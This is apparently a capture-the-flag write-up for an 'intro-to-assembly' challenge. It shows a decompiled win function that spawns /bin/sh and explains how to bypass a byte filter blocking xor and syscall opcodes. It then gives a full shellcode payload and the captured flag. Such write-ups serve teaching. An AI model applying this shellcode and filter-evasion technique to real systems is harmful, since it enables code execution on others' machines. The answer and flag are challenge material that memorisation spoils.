# intro-to-assembly

We can see that we are allowed to insert some code that the program will run.
After looking around we see the win function, and because we have no pie we can lok for a way to call that win function (the input is to small to do syscalls or stuff like that).

```c++
int __fastcall win(char *a1, int a2, int a3)
{
    strcpy(string, "/bin/shA");
    string[strlen(string) - 1] = 0;
    if ( a1 != "Hello" || a2 != 1337 || a3 )
    {
        puts("Nope");
        exit(0);
    }
    return execve(string, 0, 0);
}
```
The win function needs to have our params **(rdi, rsi, rdx)** set to:
`Hello, 1337, null` 

So some assembly like this would do the job:
```
xor rdx, rdx
mov rdi, 0x402008 
mov rsi, 1337
``` 
The string **Hello** can be found in the binary at the address ***0x402008***.

The binary has a assembly filter in place:
```c++
if ( *((_BYTE *)dest + i) == 49 || *((_BYTE *)dest + i) == 15 && *((_BYTE *)dest + i + 1) == 5 )
```

The checker looks for the keyword `XOR` and `SYSCALL`.
We can bypass it by doing:
```
push 0
pop rdx
```

An final assembly payload to set all the params of the function:
```
push 0
pop rdx
push 0x402008
pop rdi
push 1337
pop rsi
push 0x4012bb
pop rax
call rax
```

[[intro-to-assembly-exploit.py]]

flag: `CTF{926e420eeeeb6ac4890ddd46af5462d922e01307ef77d97d6799b167ed17e44f}`